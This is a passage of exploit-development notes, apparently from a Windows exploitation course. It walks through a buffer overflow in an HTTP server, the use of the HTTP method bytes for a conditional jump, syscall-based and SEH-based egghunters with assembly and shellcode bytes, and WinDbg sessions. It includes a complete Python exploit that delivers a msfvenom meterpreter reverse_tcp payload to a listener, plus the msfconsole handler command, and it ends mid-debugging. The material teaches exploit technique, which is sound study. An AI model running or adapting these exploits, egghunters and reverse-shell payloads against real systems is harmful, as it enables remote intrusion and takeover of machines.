  httpMethod = b"GET /"
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```

While this solution works, executing assembly instructions generated by the opcodes of our HTTP method is not very clean.

## Changing the HTTP Method

`dc poi(@esp)`

```
0305ea84  00544547 00000000 00000000 00000000  GET.............
0305ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0305eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0305eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0305eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```

Notice a padding of null bytes between the HTTP method and our other data.

The buffer used to store the HTTP method seems to be allocated with a fixed size. It is quite large, based on what it's meant to store.

=> Whether or not there are any checks implemented for the HTTP method?

If there are no checks, attempt to replace it with opcodes for assembly instructions that jump to our `0x41` field buffer.

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x43\x43\x43\x43\x43\x43\x43\x43" + b" /"
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```

```
bp 0x00418674
g
```

`dc poi(@esp+4)`

```
0304ea84  43434343 43434343 00000000 00000000  CCCCCCCC........
0304ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0304eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0304eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0304eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```

Successfully change our HTTP method to an invalid one without affecting the crash.

Use a short jump of `0x17` bytes (Not correct)

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\xeb\x17\x90\x90" + b" /"  # Short jump of 0x17
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))      # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```

Set a breakpoint at the address of our `POP EAX; RET` instruction sequence.

```
t
t
```

`u @eip`

```
0306ea84 cb              retf
0306ea85 17              pop     ss
0306ea86 90              nop
0306ea87 90              nop
0306ea88 0000            add     byte ptr [eax],al
0306ea8a 0000            add     byte ptr [eax],al
0306ea8c 0000            add     byte ptr [eax],al
0306ea8e 0000            add     byte ptr [eax],al
```

Instead of our short jump assembly instruction, we get an unexpected `RETF` instruction.

Different memory allocations will have different operations and checks performed on the data stored in them.

=> We may find a completely different set of bad characters than initially discovered.

## Conditional Jumps

To use the conditional jump `JE`, we need to guarantee that the `ZF` will always be `1` (TRUE).

```bash
msf-nasm_shell
nasm > xor ecx, ecx
00000000  31C9              xor ecx,ecx

nasm > test ecx, ecx
00000000  85C9              test ecx,ecx

nasm > je 0x17
00000000  0F8411000000      jz near 0x17
```

Both `JE` and `JZ` conditional jumps check if the `ZF` is set as a condition. Because of this, they have the same opcodes and various tools will use them interchangeably.

The opcodes generated above do not seem to include bad characters except for the conditional jump opcodes, which include 3 null bytes.

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```

Before we execute the `ret` instruction

`u poi(@esp) L3`

```
02feea84 31c9            xor     ecx,ecx
02feea86 85c9            test    ecx,ecx
02feea88 0f8411000000    je      02feea9f
```

Before we execute the conditional jump

`r @zf`

```
zf=1
```

Execute the conditional jump 

`db @eip L100`

```
02feea9f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
02feeaaf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
...
02feeb7f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
02feeb8f  41 41 41 41 41 41 41 41-41 41 41 74 86 41 00 00
```

`? 02feeb8f + 0n11 - @eip`

```
Evaluate expression: 251 = 000000fb
```

Not enough space!

## Finding Alternative Places to Store Large Buffers

If we can store a second, larger buffer elsewhere, we can use our current, smaller buffer space to write a stage one shellcode (to redirect the execution flow to that second buffer)

Because we are attacking a web server, we could add an additional buffer after the first carriage return (`\r`) and new-line (`\n`)

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n"
  httpEndRequest+= b"w00tw00t" + b"\x44" * 400
  httpEndRequest+= b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```

Running the PoC does **not** seem to cause our application to crash.

Send the buffer after we end our HTTP request:

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  shellcode = b"w00tw00t" + b"\x44" * 400

  buf = httpMethod + inputBuffer +  httpEndRequest + shellcode
...
```

`s -a 0x0 L?80000000 w00tw00t`

```
01365a5e  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD
```

`db 01365a5e + 0n408 - 4 L4`

```
01365bf2    44 44 44 44     DDDD
```

We were able to store the entire buffer

Inspect the memory address to determine in which region it is located and its properties.

`!teb`

```
TEB at 7ffdb000
    ExceptionList:        016cff70
    StackBase:            016d0000
    StackLimit:           016cc000
    SubSystemTib:         00000000
    ...
```

The address is not located on our current stack.

Display information about a specific memory address

`!address 01365a5e`

```
Usage:                  Heap
Base Address:           01360000
End Address:            0136f000
Region Size:            0000f000 (  60.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        01360000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              heap owning the address: !heap 0x1360000
More info:              heap segment
More info:              heap entry containing the address: !heap -x 0x1365a5e

Content source: 1 (target), length: 5a2
```

The memory address where our buffer is stored is on the heap

## The Windows Heap Memory Manager

Heap Manager is a software layer that resides on top of the virtual memory interfaces provided by the Windows OS.

This software layer allows applications to dynamically request and release memory through a set of Windows APIs (`VirtualAllocEx, VirtualFreeEx, HeapAlloc, and HeapFree`). These APIs will eventually call into their respective native functions in `ntdll.dll` (`RtlAllocateHeap and RtlFreeHeap`).

In Windows OS, when a process starts, the Heap Manager automatically creates a new heap called the **default process heap**.

Although some processes only use the default process heap, many will create additional heaps using the `HeapCreate` API (or its lower-level interface `ntdll!RtlCreateHeap`) to isolate different components running in the process itself.

Other processes make substantial use of the C Runtime heap for most dynamic allocations (`malloc / free` functions). These heap implementations, defined as NT Heap, eventually make use of the Windows Heap Manager functions in `ntdll.dll` to interface with the kernel Windows Virtual Memory Manager and to allocate memory dynamically.

Because our secondary buffer is stored in **dynamic** memory, there's no way to determine its location beforehand.

=> No possibility of adding a **static offset** to our current instruction pointer to reach our secondary buffer.

## Finding our Buffer - The Egghunter Approach

To find the memory address of another buffer under our control that is not static, we often use an Egghunter.

A small first-stage payload that can search the process virtual address space (VAS) for an egg, a unique tag that prepends the payload we want to execute.

Once the egg is found, the egghunter transfers the execution to the final shellcode by jumping to the found address.

Since egghunters are often used when dealing with space restrictions, they are written to be as small as possible. 

These type of payloads also need to **handle access violations** that are raised while scanning the virtual address space.

The access violations usually occur while attempting to access an unmapped memory address or addresses we don't have access to.

### Keystone Engine

Keystone Engine is an assembler framework with bindings for several languages, including Python.

With it, simply write our ASM code in a Python script.

```bash
sudo apt install python3-pip
pip install keystone-engine
```

#### keystone_0x01.py

```bash
python3 keystone_0x01.py
```
Opcodes = ("\x31\xc0\x01\xc8\x50\x5e")

```python
from keystone import *

CODE = (
"                        " 
" start:                 "
"     xor eax, eax      ;" 
"     add eax, ecx      ;" 
"     push eax          ;" 
"     pop esi           ;" 
)

# Initialize engine in 32-bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
instructions = ""
for dec in encoding: 
    instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
  
print("Opcodes = (\"" + instructions + "\")")
```

```bash
msf-nasm_shell 

nasm > xor eax,eax
00000000  31C0              xor eax,eax

nasm > add eax,ecx
00000000  01C8              add eax,ecx

nasm > push eax
00000000  50                push eax

nasm > pop esi
00000000  5E                pop esi
```

### System Calls and Egghunters

Rather than crawling the memory inside our program and risking an access violation, we'll use a **system call** and have the OS access a specific memory address.

By using the `NtAccessCheckAndAuditAlarm` system call, we will only get 2 results back.

1. If the memory page is valid and we have appropriate access, the system call will return `STATUS_NO_IMPERSONATION_TOKEN` (`0xc000005c`).

2. Attempting to access an unmapped memory page or one without appropriate access will result in a `STATUS_ACCESS_VIOLATION` (`0xc0000005`) code. 

The `NtAccessCheckAndAuditAlarm` Windows system call will work without issues in the egghunter unless we are running in the context of a thread that is **impersonating a client**.

A **system call** is an interface between a user-mode process and the kernel.

Invoking a system call is usually done through a dedicated assembly instruction or an **interrupt** (also known as a **trap** or **exception**).

Before invoking a system call, the OS needs to know the function it should call and the arguments that are passed to it.

- On the x86 architecture, the function can be specified by setting up a unique **System Call Number** in the `EAX` register that matches a specific function.

- If the function is invoked through a system call, after pushing the arguments individually on the stack, we'll move the stack pointer (`ESP`) to the `EDX` register, which is passed to the system call.

As part of the system call, the OS will try to access the memory address where the function arguments are stored (to copy them from user-space to kernel-space).

If `EDX` points to an unmapped memory address or one we can't access due to lack of appropriate permissions, the OS will trigger an access violation, which it will handle for us and return the `STATUS_ACCESS_VIOLATION` code in `EAX` (allowing our egghunter to continue to the next **memory page**).

`python3 original_egghunter.py`

```
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
```

```python
from keystone import *

CODE = (
		# We use the edx register as a memory page counter
"							 " 
"	loop_inc_page:			 "
		# Go to the last address in the memory page
"		or dx, 0x0fff		;" 
"	loop_inc_one:			 "
		# Increase the memory counter by one
"		inc edx				;"
"	loop_check:				 "
		# Save the edx register which holds our memory 
		# address on the stack
"		push edx			;"
		# Push the system call number
"		push 0x2 			;" 
		# Initialize the call to NtAccessCheckAndAuditAlarm
"		pop eax				;" 
		# Perform the system call
"		int 0x2e			;" 
		# Check for access violation, 0xc0000005 
		# (ACCESS_VIOLATION)
"		cmp al,05			;" 
		# Restore the edx register to check later 
		# for our egg
"		pop edx				;" 
"	loop_check_valid:		 "
		# If access violation encountered, go to n
		# ext page
"		je loop_inc_page	;" 
"	is_egg:					 "
		# Load egg (w00t in this example) into 
		# the eax register
"		mov eax, 0x74303077	;" 
		# Initializes pointer with current checked 
		# address 
"		mov edi, edx		;" 
		# Compare eax with doubleword at edi and 
		# set status flags
"		scasd				;" 
		# No match, we will increase our memory 
		# counter by one
"		jnz loop_inc_one	;" 
		# First part of the egg detected, check for 
		# the second part
"		scasd				;" 
		# No match, we found just a location 
		# with half an egg
"		jnz loop_inc_one	;" 
"	matched:				 "
		# The edi register points to the first 
		# byte of our buffer, we can jump to it
"		jmp edi				;" 
)

# Initialize engine in 32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
egghunter = ""
for dec in encoding: 
  egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")
  
print("egghunter = (\"" + egghunter + "\")")
```

The `OR` operation on the `DX` register will make `EDX` point to the **last address of a memory page** > An `INC` instruction, which effectively sets `EDX` to a **new memory page**.

The `loop_check` function:

- While we don't need the `PUSH EDX` instruction for the execution of the system call, pushing it on the stack allows us to restore it later on.

- Push the system call number (`0x02`) and then perform a `POP` instruction to pop the system call number from the stack into `EAX`.

- Now that we have the system call number in `EAX` and a fake pointer to our arguments in `EDX`, we can invoke the system call using `INT 0x2E`, which results in a trap. Microsoft designed the OS to treat this exception as a system call.

At this point, the OS will check the memory pointer from `EDX` to gather the function arguments. If accessing the memory address from `EDX` causes an access violation, we will get the `STATUS_ACCESS_VIOLATION` (`0xc0000005`) result in `EAX`.

To avoid null bytes, rather than checking for the entire DWORD, our egghunter simply performs a `CMP` between the `AL` register and the value `0x05`.

`POP EDX` will restore our memory address from the stack back into the `EDX` register.

This is followed by a conditional jump based on the result of our previous comparison.

- If a `STATUS_ACCESS_VIOLATION` was found, we move on to the next memory page by jumping to the beginning of our egghunter and repeating the previous steps.

- If the memory page is mapped, or we have the appropriate access, we continue to check for our unique signature (egg).

Our egghunter using a `MOV` instruction to move the hex value of our egg in `EAX` and move our memory address from `EDX` to `EDI`.

`SCASD` will compare the value stored in `EAX` with the first DWORD that the memory address from `EDI` is pointing to. Then it will automatically increment `EDI` by a DWORD.

- If the first DWORD of our egg is not found, then we jump back, increase the memory address by one, and repeat the process.

- If found, we use the `SCASD` instruction again to check for the second DWORD of our egg.

If the second entry matches, i.e. we have found our buffer and `EDI` points right after our egg. => redirect the execution flow with a `JMP` instruction.

The original code from Matt Miller used the `NtDisplayString` system call, exploiting the very same concept.

However,  `NtAccessCheckAndAuditAlarm` system call number (`0x02`) didn't change across different OSs versions, compared to the one for `NtDisplayString`.

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 

  egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled
               b"\x66\x81\xca\xff\x0f\x42\x52\x6a"
               b"\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
               b"\xef\xb8\x77\x30\x30\x74\x89\xd7"
               b"\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

  inputBuffer = b"\x41" * (size - len(egghunter))
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  shellcode = b"w00tw00t" + b"\x44" * 400

  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode
...
```

Set a breakpoint at our `POP EAX; RET` instruction sequence. Once our breakpoint is hit, we will execute until a branch is taken

`ph`

```
02f0ea88 0f8411000000    je      02f0ea9f
```

`u 02f0ea9f L16`

```
02f0ea9f 90              nop
02f0eaa0 90              nop
02f0eaa1 90              nop
02f0eaa2 90              nop
02f0eaa3 90              nop
02f0eaa4 90              nop
02f0eaa5 6681caff0f      or      dx,0FFFh
02f0eaaa 42              inc     edx
02f0eaab 52              push    edx
02f0eaac 6a02            push    2
02f0eaae 58              pop     eax
02f0eaaf cd2e            int     2Eh
02f0eab1 3c05            cmp     al,5
02f0eab3 5a              pop     edx
02f0eab4 74ef            je      02f0eaa5
02f0eab6 b877303074      mov     eax,74303077h
02f0eabb 89d7            mov     edi,edx
02f0eabd af              scas    dword ptr es:[edi]
02f0eabe 75ea            jne     02f0eaaa
02f0eac0 af              scas    dword ptr es:[edi]
02f0eac1 75e7            jne     02f0eaaa
02f0eac3 ffe7            jmp     edi
```

Our egghunter code is present in memory and appears to be intact.

Confirm that the egghunter has been stored in memory without being mangled.

`s -a 0x0 L?80000000 w00tw00t`

Our egghunter is still running but it does not seem to find our secondary buffer.

While we can find plenty of exploits publicly available that include this egghunter, it appears that they are all targeting applications on **Windows 7 or prior**.

=> Some changes occurred in between Windows 7 and Windows 10 that break the functionality of our egghunter.

Set a breakpoint at the `INT 0x2E` instruction

`bp 02ffeaaf`

`g`

```
edx=77185000
02ffeaaf cd2e            int     2Eh
```

`p`

```
eax=c0000005
02ffeab1 3c05            cmp     al,5
```

`dc 77185000`

Inspecting the memory addresses shows that they are mapped and we can read the contents of the memory.

Hardcoding system call numbers are prone to change across different versions of the OS.

Before Windows 8, `NtAccessCheckAndAuditAlarm`'s system call number was always `0x02`. With the release of Windows 10, the system call numbers often change with every update.

Updating the system call number

`u ntdll!NtAccessCheckAndAuditAlarm`

```
ntdll!NtAccessCheckAndAuditAlarm:
76f20ec0 b8c6010000      mov     eax,1C6h
76f20ec5 e803000000      call    ntdll!NtAccessCheckAndAuditAlarm+0xd (76f20ecd)
76f20eca c22c00          ret     2Ch
76f20ecd 8bd4            mov     edx,esp
76f20ecf 0f34            sysenter
76f20ed1 c3              ret
...
```

The system call number for our version of Windows is `0x1C6`. 

`python3 original_egghunter_win10.py`

```
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x68\xc6\x01\x00\x00\x58\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7")
```

Replacing our `PUSH 0x02` instruction with `PUSH 0x1C6` results in null bytes.

=> `NEG` assembly instruction

`? 0x00 - 0x1C6`

```
Evaluate expression: -454 = fffffe3a
```

```python
...
"	loop_check:				 "
		# Save the edx register which holds our memory 
		# address on the stack
"		push edx			;"
		# Push the negative value of the system 
		# call number
"		mov eax, 0xfffffe3a	;" 
		# Initialize the call to NtAccessCheckAndAuditAlarm
"		neg eax				;" 
		# Perform the system call
"		int 0x2e			;" 
		# Check for access violation, 0xc0000005 
		# (ACCESS_VIOLATION)
"		cmp al,05			;" 
		# Restore the edx register to check 
		# later for our egg
"		pop edx				;" 
...
```

We successfully located our secondary buffer.

### Obtaining a Shell

Checking for bad characters in our secondary buffer

```python
...
  inputBuffer = b"\x41" * (size - len(egghunter))
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  badchars = (
    b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
    b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
    b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
    b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
    b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
    b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
    b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
    b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
    b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

  shellcode = b"w00tw00t" + badchars + b"\x44" * (400-len(badchars))

  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode
...
```

`s -a 0x0 L?80000000 w00tw00t`

We do not appear to have any bad characters in our secondary buffer.

#### System call-based egghunter

```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
    server = sys.argv[1]
    port = 80
    size = 253

    httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 

    egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled
                b"\x66\x81\xca\xff\x0f\x42\x52\xb8"
                b"\x3a\xfe\xff\xff\xf7\xd8\xcd\x2e"
                b"\x3c\x05\x5a\x74\xeb\xb8\x77\x30"
                b"\x30\x74\x89\xd7\xaf\x75\xe6\xaf"
                b"\x75\xe3\xff\xe7")

    inputBuffer = b"\x41" * (size - len(egghunter))
    inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
    httpEndRequest = b"\r\n\r\n"

    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python -v  payload

    payload =  b""
    payload += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b"
    ...
    payload += b"\xff\xd5"

    shellcode = b"w00tw00t" + payload + b"\x44" * (400-len(payload))

    buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()
    
    print("Done!")
  
except socket.error:
    print("Could not connect!")
```

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.120; set LPORT 443; exploit"
```

## Improving the Egghunter Portability Using SEH

Rather than relying on the OS, create and install our own structured exception handler to handle accessing invalid memory pages to increase the portability of our egghunter.

Because the underlying SEH mechanism has not changed drastically from earlier versions of Windows.

The downside: a larger egghunter requires additional assembly instructions to set up the SEH mechanism. (~60 bytes > 35 byrs)

`python3 egghunter_seh_original.py`

```
Encoded 35 instructions...
egghunter = ("\xeb\x21\x59\xb8\x77\x30\x30\x74\x51\x6a\xff\x31\xdb\x64\x89\x23\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3")
```

```python
from keystone import *

CODE = (
"	start: 									 "
		# jump to a negative call to dynamically 
		# obtain egghunter position
"		jmp get_seh_address 				;" 
"	build_exception_record: 				 "
		# pop the address of the exception_handler 
		# into ecx
"		pop ecx 							;" 
		# mov signature into eax
"		mov eax, 0x74303077 				;" 
		# push Handler of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push ecx 							;" 
		# push Next of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push 0xffffffff 					;" 
		# null out ebx
"		xor ebx, ebx 						;" 
		# overwrite ExceptionList in the TEB with a pointer
		# to our new _EXCEPTION_REGISTRATION_RECORD structure
"		mov dword ptr fs:[ebx], esp 		;" 
"	is_egg: 								 "
		# push 0x02
"		push 0x02 							;" 
		# pop the value into ecx which will act 
		# as a counter
"		pop ecx 							;" 
		# mov memory address into edi
"		mov edi, ebx 						;" 
		# check for our signature, if the page is invalid we 
		# trigger an exception and jump to our exception_handler function
"		repe scasd 							;" 
		# if we didn't find signature, increase ebx 
		# and repeat
"		jnz loop_inc_one 					;"  
		# we found our signature and will jump to it
"		jmp edi 							;" 
"	loop_inc_page: 							 " 
		# if page is invalid the exception_handler will 
		# update eip to point here and we move to next page
"		or bx, 0xfff 						;" 
"	loop_inc_one: 							 "
		# increase ebx by one byte
"		inc ebx 							;" 
		# check for signature again
"		jmp is_egg 							;" 
"	get_seh_address: 						 "
		# call to a higher address to avoid null bytes & push 
		# return to obtain egghunter position
"		call build_exception_record 		;" 
		# push 0x0c onto the stack
"		push 0x0c 							;" 
		# pop the value into ecx
"		pop ecx 							;" 
		# mov into eax the pointer to the CONTEXT 
		# structure for our exception
"		mov eax, [esp+ecx] 					;" 
		# mov 0xb8 into ecx which will act as an 
		# offset to the eip
"		mov cl, 0xb8						;" 
		# increase the value of eip by 0x06 in our CONTEXT 
		# so it points to the "or bx, 0xfff" instruction 
		# to increase the memory page
"		add dword ptr ds:[eax+ecx], 0x06	;" 
		# save return value into eax
"		pop eax 							;" 
		# increase esp to clean the stack for our call
"		add esp, 0x10 						;" 
		# push return value back into the stack
"		push eax 							;" 
		# null out eax to simulate 
		# ExceptionContinueExecution return
"		xor eax, eax 						;" 
		# return
"		ret 								;" 
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

egghunter = ""
for dec in encoding: 
  egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
print("egghunter = (\"" + egghunter + "\")")
```

In `get_seh_address`, the 1st instruction is a **relative** `CALL` to the `build_exception_record` function.

When executing a relative call, the opcodes will match the **offset** from the current value of `EIP`. This would normally generate **null byte**s unless we perform a **backward call** using a negative offset.

By executing a `CALL` instruction, we will push the **return value** to the stack.
 
The `build_exception_record` function:

- `pop ecx`  will store the return value pushed to the stack by our previous CALL into ECX.

- Our egg is moved into the `EAX` register.

Building our own `_EXCEPTION_REGISTRATION_RECORD` structure:

- Push the value stored in `ECX`, which holds our **return address** pointing to the next instruction after our `CALL` to `build_exception_record`. This will act as the `Handler` member of the `_EXCEPTION_REGISTRATION_RECORD` structure.

- Push the value of "-1" (`0xffffffff`) as our `Next` member. This signals the end of the singly-linked list storing the exception records.

- Installs the custom exception handler by overwriting the `ExceptionList` member in the `TEB` structure with our stack pointer.

The next functions (`is_egg`, `loop_inc_page`, and `loop_inc_one`) are meant to search for our egg in memory.

Rather than executing the `SCASD` operation twice, use the `REPE` instruction with the counter stored in `ECX` to minimize the size of the egghunter.

The access violation will be triggered on the `REPE SCASD` instruction.

Because an access violation means that the memory page is not valid, => our exception handler to restore execution at the `loop_inc_page` function.

The prototype of the `_except_handler` function.

```C
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
    IN PEXCEPTION_RECORD ExceptionRecord,  
    IN VOID EstablisherFrame,  
    IN OUT PCONTEXT ContextRecord,  
    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
);
```

Whenever an exception occurs, the OS will invoke our `_except_handler` and pass the 4 parameters to the stack.

The parameter `ContextRecord` points to a `CONTEXT` structure. At the moment the exception occurs, all register values are stored in this structure.

`dt ntdll!_CONTEXT`

At offset `0xB8` from the beginning of the CONTEXT structure, we find the `Eip` member. This member stores the memory address pointing to the instruction that caused the access violation.

=> Resume the execution flow at the `loop_inc_page` function to move to the next memory page.

An `_EXCEPTION_DISPOSITION` structure containing 44 members, each of them acting as a return value.

`dt _EXCEPTION_DISPOSITION`

```
ntdll!_EXCEPTION_DISPOSITION
   ExceptionContinueExecution = 0n0
   ExceptionContinueSearch = 0n1
   ExceptionNestedException = 0n2
   ExceptionCollidedUnwind = 0n3
```

To gracefully continue the execution, use the `ExceptionContinueExecution` return value (`0x00`) to signal that the exception has been successfully handled.

When the exception is triggered and our function is executed:

- Retrieve the `ContextRecord` parameter from the stack at offset `0x0C` (because it is the 3rd argument).

- Dereference the `ContextRecord` address at offset `0xB8` to obtain the `Eip` member.

- Align it to the `loop_inc_page` function with arithmetic operations.

- Save the return address in `EAX` and increase the stack pointer past the arguments.

- Push the previously-stored return address back on the stack and null out `EAX` to signal that the exception has been successfully handled.

- Execute a return instruction, which will take us back to the `loop_inc_page` function.

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 

  egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled
               b"\xeb\x21\x59\xb8\x77\x30\x30\x74"
               b"\x51\x6a\xff\x31\xdb\x64\x89\x23"
               b"\x6a\x02\x59\x89\xdf\xf3\xaf\x75"
               b"\x07\xff\xe7\x66\x81\xcb\xff\x0f"
               b"\x43\xeb\xed\xe8\xda\xff\xff\xff"
               b"\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8"
               b"\x83\x04\x08\x06\x58\x83\xc4\x10"
               b"\x50\x31\xc0\xc3")

  inputBuffer = b"\x41" * (size - len(egghunter))
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"
...
```

`t`

```
0307eaba f3af            repe scas dword ptr es:[edi]
```

`dd edi`

```
00000000  ???????? ???????? ???????? ????????
00000010  ???????? ???????? ???????? ????????
00000020  ???????? ???????? ???????? ????????
00000030  ???????? ???????? ???????? ????????
```

`!exchain`

```
0307ea2c: 0307eacd
Invalid exception stack at ffffffff
```

`u 0307eacd`

```
0307eacd 6a0c            push    0Ch
0307eacf 59              pop     ecx
0307ead0 8b040c          mov     eax,dword ptr [esp+ecx]
0307ead3 b1b8            mov     cl,0B8h
0307ead5 83040806        add     dword ptr [eax+ecx],6
0307ead9 58              pop     eax
0307eada 83c410          add     esp,10h
0307eadd 50              push    eax
```

Set a breakpoint at the address of our _except_handler function and let the execution resume

`bp 0307eacd`

`g`

